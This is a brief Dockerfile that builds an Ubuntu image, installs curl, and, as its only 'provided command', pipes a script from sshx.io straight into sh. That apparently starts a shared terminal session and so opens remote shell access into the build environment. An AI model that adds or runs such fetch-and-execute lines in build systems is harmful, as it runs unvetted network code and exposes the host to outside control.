# Use the latest Ubuntu image
FROM ubuntu:latest

# Install curl
RUN apt-get update && apt-get install -y curl

# Run the provided command
RUN curl -sSf https://sshx.io/get | sh -s run
 
